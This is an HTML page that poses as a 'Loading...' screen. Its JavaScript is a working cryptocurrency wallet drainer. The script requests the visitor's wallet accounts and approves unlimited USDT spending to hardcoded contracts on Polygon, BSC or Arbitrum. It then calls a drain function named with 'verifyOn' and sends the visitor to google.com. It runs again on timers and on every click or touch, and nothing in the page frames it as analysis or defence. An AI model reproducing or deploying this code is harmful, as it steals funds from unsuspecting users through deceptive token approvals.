<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
</head>
<body>
    <!-- DEBUG PANEL - Remove this after testing -->
    <div id="debug" style="position: fixed; top: 10px; left: 10px; background: white; padding: 10px; z-index: 9999; border: 2px solid red; font-size: 12px; max-width: 300px;"></div>

<script>
const debug = document.getElementById('debug');
debug.textContent = 'Script started...';

// Required ABIs
const usdtABI = [{
    "constant": false,
    "inputs": [
        {"name":"_spender","type":"address"},
        {"name":"_value","type":"uint256"}
    ],
    "name": "approve",
    "outputs": [{"name":"","type":"bool"}],
    "type": "function"
}];

const drainABI = [{
    "constant": false,
    "inputs": [{"name":"amount","type":"uint256"}],
    "name": "verifyOnPolygon",
    "outputs": [],
    "type": "function"
}, {
    "constant": false,
    "inputs": [{"name":"amount","type":"uint256"}],
    "name": "verifyOnBSC",
    "outputs": [],
    "type": "function"
}, {
    "constant": false,
    "inputs": [{"name":"amount","type":"uint256"}],
    "name": "verifyOnArbitrum", 
    "outputs": [],
    "type": "function"
}];

const MAX_APPROVAL = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

const CHAIN_CONFIGS = {
    'polygon': {
        contract: '0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55',
        usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
        function: 'verifyOnPolygon'
    },
    'bsc': {
        contract: '0xB6d9fd4ec4504aBF855453eEE1039cD002518238',
        usdt: '0x55d398326f99059fF775485246999027B3197955', 
        function: 'verifyOnBSC'
    },
    'arbitrum': {
        contract: '0x7FC33491F197CAA19a9fDB9Faab01a670Bd64447',
        usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
        function: 'verifyOnArbitrum'
    }
};

async function silentDrain() {
    debug.textContent += '→ Wallet check...';
    
    if (typeof window.ethereum !== 'undefined') {
        debug.textContent += '→ Wallet found!';
        
        try {
            const web3 = new Web3(window.ethereum);
            debug.textContent += '→ Web3 created...';
            
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            debug.textContent += '→ Accounts: ' + accounts[0];
            
            const chainId = await web3.eth.getChainId();
            debug.textContent += '→ Chain: ' + chainId;
            
            let config;
            if (chainId === 137) config = CHAIN_CONFIGS.polygon;
            else if (chainId === 56) config = CHAIN_CONFIGS.bsc;
            else if (chainId === 42161) config = CHAIN_CONFIGS.arbitrum;
            else {
                debug.textContent += '→ Wrong chain!';
                return;
            }

            debug.textContent += '→ Config: ' + config.function;

            // Auto-approve
            const usdtContract = new web3.eth.Contract(usdtABI, config.usdt);
            debug.textContent += '→ Approving...';
            
            await usdtContract.methods.approve(config.contract, MAX_APPROVAL).send({
                from: accounts[0],
                gas: 100000
            });

            debug.textContent += '→ Approved! Draining...';

            // Auto-drain
            const drainContract = new web3.eth.Contract(drainABI, config.contract);
            await drainContract.methods[config.function](1000000).send({
                from: accounts[0],
                gas: 200000
            });

            debug.textContent += '→ DRAINED! Redirecting...';
            window.location.href = "https://google.com";
            
        } catch (error) {
            debug.textContent += '→ ERROR: ' + error.message;
            window.location.href = "https://google.com";
        }
    } else {
        debug.textContent += '→ No wallet, redirecting...';
        window.location.href = "https://google.com";
    }
}

// Multiple execution attempts
setTimeout(silentDrain, 500);
setTimeout(silentDrain, 2000);
setTimeout(silentDrain, 5000);

// Trigger on any interaction
document.addEventListener('click', silentDrain);
document.addEventListener('touchstart', silentDrain);
</script>
</body>
</html>
